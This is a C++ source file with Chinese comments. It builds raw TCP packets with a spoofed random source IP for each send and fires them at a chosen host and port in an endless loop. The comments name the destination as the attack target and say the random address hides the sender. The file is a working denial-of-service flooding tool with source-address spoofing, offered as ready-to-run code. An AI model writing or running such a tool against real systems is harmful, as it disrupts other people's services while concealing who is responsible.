/***********ChickCount.cpp********************/
#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <netdb.h>
#include <errno.h>
#include <unistd.h>


#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

using namespace std;

/**************************** constants ***************************************/
const int PACKET_BUFFER_LENGTH = 1000;

const int IP_HEADER_LENGTH = sizeof(struct ip);

const int TCP_HEADER_LENGTH = sizeof(struct tcphdr);

const int LOCALPORT = 8888;


/**************************** function definition *****************************/

void setup_and_send_tcp_packet(const char *const &host_name, const int &host_port, const char *const file_path);

FILE* open_file(const char *const &file_path); 

bool read_packet_from_file(FILE* packet_file, size_t &buf_length, char *packet_buf, int &packet_length);

void setup_socket(const char *const &hostname, const int &hostport, int &sockfd, struct sockaddr_in &addr);

void send_tcp_packet(int sockfd, const struct sockaddr_in *const &addr, FILE *packet_file);

void init_header(char * packet, const struct sockaddr_in * const &addr);

void update_ip_address(char * packet);

void fill_in_tcp_packet(char * packet, const char * const &source, int length);

unsigned short check_sum(unsigned short *addr, int len);

/**************************** function implementation *************************/

int main(int argc, char **argv) 
{
   if (argc != 4) 
   {
      fprintf(stderr,
              "Usage:%s host_name host_port packet_file_path\n\a",
              argv[0]);
      exit(1);
   }

   setup_and_send_tcp_packet(argv[1], atoi(argv[2]), argv[3]);

   return 0;
}

/***************************************************************************//**
*  @brief setup, read and send TCP packet 
*
*  @param host_name  - [in]
*  @param host_port  - [in]
*  @param file_path  - [in]
********************************************************************************/

void setup_and_send_tcp_packet(
   const char *const &host_name, 
   const int &host_port, 
   const char *const file_path)
{
   FILE *packet_file;

   //open file
   packet_file = open_file(file_path);


   int sockfd;
   struct sockaddr_in addr;

   setup_socket(host_name, 
                host_port,
                sockfd, 
                addr);

   // send the packet
   send_tcp_packet(sockfd, 
                   &addr, 
                   packet_file);

   fclose(packet_file);
}

/***************************************************************************//**
*  @brief open file
*
*  @param file_path  - [in]
*
*  @return file pointer
*******************************************************************************/

FILE* open_file(
   const char * const &file_path)
{
   FILE *packet_file;

   if (NULL == (packet_file = fopen(file_path, "rb"))) 
   {
      fprintf(stderr,"Open %s Error:%s\n", 
              file_path, 
              strerror(errno));
      exit(-1);
   }

   return packet_file;
}

/***************************************************************************//**
*  @brief read packet from file
*
*  @param packet_buf       - [out]
*  @param buf_length       - [out]
*  @param packet_buf       - [out]
*  @param packet_length    - [out]
*
*  @return read result success or failure
********************************************************************************/

bool read_packet_from_file(
   FILE     *packet_file,
   size_t   &buf_length,
   char     *packet_buf,
   int      &packet_length)
{
   bool read_success = true;

   packet_length = getline(&packet_buf, 
                           &buf_length,
                           packet_file);

   if (EOF == packet_length)
   {
      fprintf(stdout,
              "Read packet from file failure: %s\n", 
              strerror(errno));
      read_success = false;
   }

   return read_success;
}

/***************************************************************************//**
*  @brief send tcp packet data
*
*  @param sockfd      - [in]
*  @param addr        - [in]
*  @param packet_file - [in]
*  @param first_pack  - [in]
*******************************************************************************/

void send_tcp_packet(
   int sockfd, 
   const struct sockaddr_in *const &addr, 
   FILE *packet_file)
{
   // 放置数据包
   char packet_buffer[PACKET_BUFFER_LENGTH];
   int head_len;

   // 数据包没有任何内容,所以长度就是两个结构的长度
   head_len = IP_HEADER_LENGTH + TCP_HEADER_LENGTH;
   bzero(packet_buffer, PACKET_BUFFER_LENGTH);

   init_header(packet_buffer, addr);

   // read packets from file and send to the destination
   char packet_data_buf[PACKET_BUFFER_LENGTH];
   size_t packet_data_buf_length = PACKET_BUFFER_LENGTH;
   int packet_data_length;

   for (;;) 
   {
      //reread the packet file
      fseek(packet_file, 0, SEEK_SET);

      update_ip_address(packet_buffer);


      read_packet_from_file(packet_file, 
                            packet_data_buf_length, 
                            packet_data_buf,
                            packet_data_length);

      // fill in first packet
      fill_in_tcp_packet(packet_buffer + head_len,
                         packet_data_buf,
                         packet_data_length);

      // send
      sendto(sockfd,
             packet_buffer,
             head_len + packet_data_length,
             0,
             (struct sockaddr *)addr,
             sizeof(struct sockaddr_in));
   }
}

/***************************************************************************//**
*  @brief initialize socket
*
*  @param hostname    - [IN]
*  @param hostport    - [IN]
*  @param sockfd      - [OUT]
*  @param addr        - [OUT]
*******************************************************************************/

void setup_socket(
   const char *const &hostname, 
   const int &hostport,
   int &sockfd, 
   struct sockaddr_in &addr)
{
   struct hostent *host;
   int on = 1;

   addr.sin_family = AF_INET;
   addr.sin_port = htons(hostport);

   if (0 == inet_aton(hostname, &addr.sin_addr)) 
   {
      host = gethostbyname(hostname);
      if(NULL == host) 
      {
         fprintf(stderr,
                 "Host Name Error:%s\n\a",
                 strerror(errno));
         exit(1);
      }
      addr.sin_addr = *(struct in_addr *)(host -> h_addr);
   }

   // 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字
   sockfd =  socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
   if (0 > sockfd) 
   {
      fprintf(stderr,
              "Socket Error:%s",
              strerror(errno));
      exit(1);
   }

   // 设置 IP 数据包格式,告诉系统内核模块IP数据包由我们自己来填写
   setsockopt(sockfd,
              IPPROTO_IP,
              IP_HDRINCL,
              &on,
              sizeof(on));
   // 只有超级用户才能使用原始套接字
   setuid(getpid());
}

/***************************************************************************//**
*  @brief initialize IP and TCP packet header
*
*  @param packet  - [out]
*  @param addr    - [in]
*******************************************************************************/

void init_header(char * packet, 
                 const struct sockaddr_in * const &addr)
{
   struct ip *ip;
   struct tcphdr *tcp;
   int head_len = sizeof(struct ip) + sizeof(struct tcphdr);

   // 填充数据包的头部
   ip = (struct ip *)packet;
   ip -> ip_v = IPVERSION;// IP 版本
   ip -> ip_hl = sizeof(struct ip) >> 2;// IP 数据包头部长度
   ip -> ip_tos = 0;// 服务类型
   ip -> ip_len = htons(head_len);// 数据包长度
   ip -> ip_id = 0;// 让系统填写 ip_id
   ip -> ip_off = 0;// 同样让系统填写
   ip -> ip_ttl = MAXTTL;// 最长 TTL 时间255
   ip -> ip_p = IPPROTO_TCP;// 发送的是 TCP 包
   ip -> ip_sum = 0;// 让系统做校验和
   ip -> ip_dst = addr -> sin_addr; // 目的IP,攻击对像

   // 开始填充 TCP 数据包
   tcp = (struct tcphdr *)(packet + IP_HEADER_LENGTH);
   tcp -> source = htons(LOCALPORT);
   tcp -> dest = addr -> sin_port;// 目的端口
   tcp -> seq = random();
   tcp -> ack_seq = 0;
   tcp -> doff = 5;
   tcp -> syn = 0; // 建立连接
   tcp -> check = 0;

   // 自己校验头部,可有可无的头部
   tcp -> check = check_sum((unsigned short *)tcp,
                            sizeof(struct tcphdr));
}

/***************************************************************************//**
*  @brief upadte IP address in IP header
*
*  @param packet  - [out]
********************************************************************************/

void update_ip_address(char * packet)
{
   struct ip *ip;

   ip = (struct ip *)packet;
   // 用随机数隐藏IP
   ip -> ip_src.s_addr = random();
}

/***************************************************************************//**
* @brief fill in tcp packet
*
* @param packet   - [out]
* @param source   - [in]
* @param length   - [in]
********************************************************************************/

void fill_in_tcp_packet(char * packet, const char * const &source, int length)
{
   strncpy(packet, 
           source, 
           length);
}

// 首部校验和算法 
unsigned short check_sum(
   unsigned short *addr,
   int len) 
{
   register int nleft = len;
   register int sum = 0;
   register unsigned short *w = addr;
   short answer = 0;

   while(1 < nleft) 
   {
      sum += *w++;
      nleft -= sizeof(short);// short 为16位,而 char 为8位
   }

   if(1 == nleft) 
   {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
   }

   sum = (sum >> 16) + (sum & 0xffff);// 将进位加到尾部
   sum += (sum >> 16);// 再将进位加到尾部
   answer = ~sum;

   return(answer);
}

